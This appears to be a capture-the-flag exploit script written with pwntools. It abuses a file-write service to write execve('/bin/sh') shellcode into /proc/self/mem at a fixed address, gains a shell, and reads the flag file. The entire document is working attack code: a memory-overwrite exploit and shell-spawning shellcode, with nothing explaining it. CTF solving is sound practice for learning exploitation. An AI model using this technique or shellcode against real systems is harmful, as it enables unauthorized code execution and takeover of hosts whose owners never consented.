import sys
from pwn import *

context.arch = 'amd64'

io = remote(sys.argv[1], sys.argv[2])
#io = process('../deploy/write_file')
#gdb.attach(io)

target = 0x4012af

shellcode = '''
mov rax, %d
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
syscall
''' % u64('/bin/sh\0')

io.sendlineafter(': ', '/proc/self/mem')
io.sendlineafter(': ', str(target))
io.sendlineafter(': ', asm(shellcode))

io.sendline('cat /flag')
output = io.recv().decode()

flag = re.findall('^FLAG{[0-9a-zA-Z_]+}$', output)[0]
print(flag)